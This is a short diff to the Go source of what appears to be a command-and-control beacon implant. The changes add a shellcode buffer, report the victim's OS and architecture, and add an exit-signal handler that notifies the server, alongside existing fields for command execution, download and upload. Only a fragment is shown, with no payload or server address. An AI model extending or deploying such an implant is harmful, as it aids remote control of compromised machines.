@@ -1,10 +1,14 @@
 package main
 
 import (
+	"os"
 	"fmt"
 	"time"
+	"context"
+	"runtime"
 	"net/http"
 	"encoding/json"
+	"github.com/thecodeteam/goodbye"
 )
 
 type Beacon struct {
@@ -14,6 +18,7 @@ type Beacon struct {
 	ExecBuffer []string
 	DownloadBuffer []string
 	UploadBuffer []string
+	ShellcodeBuffer []string
 	LastSeen time.Time 	
 }
 
@@ -40,7 +45,7 @@ func main() {
 	lhost, err := externalIP()
 	debugFatal(err)
 	ip = lhost
-	jsonData, err := json.Marshal(CommandUpdate{ip,id,"",nil})
+	jsonData, err := json.Marshal(CommandUpdate{ip,id,runtime.GOOS,runtime.GOARCH,"",nil})
 	debugFatal(err)
 	
 	var encoder = Base64Encoder {
@@ -61,6 +66,13 @@ func main() {
 		method: "GET",
 		data: encoder.scramble(),
 	}
+
+	ctx := context.Background()
+	defer goodbye.Exit(ctx, -1)
+	goodbye.Notify(ctx)
+	goodbye.Register(func(ctx context.Context, sig os.Signal) {
+		serverUpdateRequest.exitHandler()
+	})
 
 	for range time.Tick(time.Millisecond * time.Duration(msPerUpdate)) {
 		go func() {
